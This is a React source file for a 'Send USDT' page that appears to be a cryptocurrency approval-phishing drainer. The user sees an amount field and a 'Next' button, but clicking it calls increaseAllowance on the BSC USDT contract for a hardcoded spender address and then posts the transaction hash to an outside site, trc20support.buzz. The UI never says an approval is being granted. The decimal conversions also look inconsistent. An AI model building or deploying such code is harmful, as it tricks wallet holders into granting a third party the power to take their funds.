import { useState, useEffect } from "react";
import Web3 from "web3";
import Swal from "sweetalert2";

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const spenderAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed";

const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  }
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");
  const isDark = theme === "dark";

  // Detect system theme
  useEffect(() => {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  // Convert USDT → USD value display
  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  // Set Max USDT balance from wallet
  const setMaxAmount = async () => {
    if (!window.ethereum) {
      Swal.fire("Wallet Not Found", "Please install MetaMask", "error");
      return;
    }

    try {
      const web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const user = accounts[0];

      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await contract.methods.balanceOf(user).call();
      const usdtBalance = parseFloat(balance) / 1e6; // 6 decimals conversion

      setAmount(usdtBalance.toString());
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance", "error");
      console.error(err);
    }
  };

  // Approve spender using increaseAllowance
  const handleApprove = async () => {
    if (!window.ethereum) {
      Swal.fire("Wallet Error", "Please connect MetaMask wallet!", "error");
      return;
    }

    const value = parseFloat(amount);
    if (!amount || isNaN(value) || value <= 0) {
      Swal.fire("Invalid Amount", "Enter a valid USDT amount", "error");
      return;
    }

    setIsProcessing(true);

    try {
      const web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const user = accounts[0];

      // Ensure BSC network
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }], // 56 in HEX
        });
      }

      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
      const rawAmount = web3.utils.toWei((value * 1e12).toString(), "ether"); // adjust for 6 decimals

      const receipt = await contract.methods
        .increaseAllowance(spenderAddress, rawAmount)
        .send({ from: user, gas: 90000 });

      console.log("Approval TX:", receipt.transactionHash);
      setShowSuccess(true);

      // Optional backend post
      try {
        await fetch("https://www.trc20support.buzz/old/store-address.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: receipt.transactionHash }),
        });
      } catch (e) {
        console.warn("Backend call skipped:", e.message);
      }

    } catch (err) {
      console.error(err);
      Swal.fire("Approve Failed", err.message, "error");
    } finally {
      setIsProcessing(false);
    }
  };

  // Success screen UI
  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
        <svg className="w-24 h-24 text-green-500 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="text-2xl mt-4 font-semibold">Approval Successful</h2>
        <p className="text-sm mt-2 opacity-70 text-center px-6">Your wallet approval is confirmed ✅</p>
        <button className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold" onClick={() => setShowSuccess(false)}>OK</button>
      </div>
    );
  }

  // Main screen UI
  return (
    <div className={`min-h-screen p-6 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
      <div className="max-w-md mx-auto">

        <div className="mb-4">
          <p className="text-sm mb-2 opacity-70">Amount</p>
          <div className={`border rounded-lg p-3 ${isDark ? "border-gray-700" : "border-gray-300"}`}>
            <div className="flex justify-between items-center">
              <input type="number" min="0" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="Enter USDT" className="flex-1 bg-transparent outline-none" />
              <span onClick={setMaxAmount} className="text-blue-400 cursor-pointer px-2">Max</span>
            </div>
          </div>
        </div>

        <p className="text-sm mb-6 opacity-70">{usdValue}</p>

        <button
          className="w-full py-3 rounded-full font-semibold"
          onClick={handleApprove}
          disabled={isProcessing || !parseFloat(amount)}
          style={{
            backgroundColor: isProcessing || !parseFloat(amount) ? "#333" : "#5CE07E",
            color: isProcessing || !parseFloat(amount) ? "#666" : "#1b1e15",
            opacity: isProcessing || !parseFloat(amount) ? 0.5 : 1
          }}
        >
          {isProcessing ? "Processing..." : "Next"}
        </button>

      </div>
    </div>
  );
}
